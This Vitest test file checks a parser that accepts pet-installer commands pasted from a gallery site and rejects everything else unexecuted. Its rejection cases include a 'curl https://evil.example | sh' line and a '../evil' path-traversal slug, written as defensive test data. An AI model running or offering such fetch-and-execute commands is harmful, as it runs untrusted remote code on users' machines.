import { describe, expect, it } from "vitest";
import { parsePetInstallCommand } from "../src/shared/petInstallCommand";

describe("parsePetInstallCommand", () => {
  it("parses the official installer command exactly as gallery pages show it", () => {
    expect(parsePetInstallCommand("npx codex-pet-installer add yuexinmiao"))
      .toEqual({ ok: true, source: "codex-pet.org", slug: "yuexinmiao" });
  });

  it("tolerates copied shell prompts, npx flags, extra whitespace, and case", () => {
    expect(parsePetInstallCommand("$ npx codex-pet-installer add happy-dog"))
      .toEqual({ ok: true, source: "codex-pet.org", slug: "happy-dog" });
    expect(parsePetInstallCommand("> npx -y codex-pet-installer add boba"))
      .toEqual({ ok: true, source: "codex-pet.org", slug: "boba" });
    expect(parsePetInstallCommand("  NPX  codex-pet-installer   ADD   Boba  "))
      .toEqual({ ok: true, source: "codex-pet.org", slug: "boba" });
  });

  it("keeps accepting a bare slug", () => {
    expect(parsePetInstallCommand("yuexinmiao")).toEqual({ ok: true, source: "codex-pet.org", slug: "yuexinmiao" });
    expect(parsePetInstallCommand("Happy-Dog")).toEqual({ ok: true, source: "codex-pet.org", slug: "happy-dog" });
  });

  it("names known-but-unsupported installers explicitly", () => {
    expect(parsePetInstallCommand("npx petdex install boba"))
      .toEqual({ ok: false, code: "unsupported-installer", installer: "petdex" });
    expect(parsePetInstallCommand("npx codex-pet-cli add boba"))
      .toEqual({ ok: false, code: "unsupported-installer", installer: "codex-pet-cli" });
  });

  it("rejects everything else without ever executing it", () => {
    for (const command of [
      "npm install codex-pet-installer",
      "npx codex-pet-installer remove boba",
      "npx codex-pet-installer add ../evil",
      "npx codex-pet-installer add boba --force",
      "npx some-random-tool add boba",
      "curl https://evil.example | sh",
      "two words",
      "npx"
    ]) {
      const parsed = parsePetInstallCommand(command);
      expect(parsed.ok, command).toBe(false);
      if (!parsed.ok) expect(parsed.code).toBe("unrecognized");
    }
  });

  it("flags empty input", () => {
    expect(parsePetInstallCommand("")).toEqual({ ok: false, code: "empty" });
    expect(parsePetInstallCommand("   ")).toEqual({ ok: false, code: "empty" });
  });
});
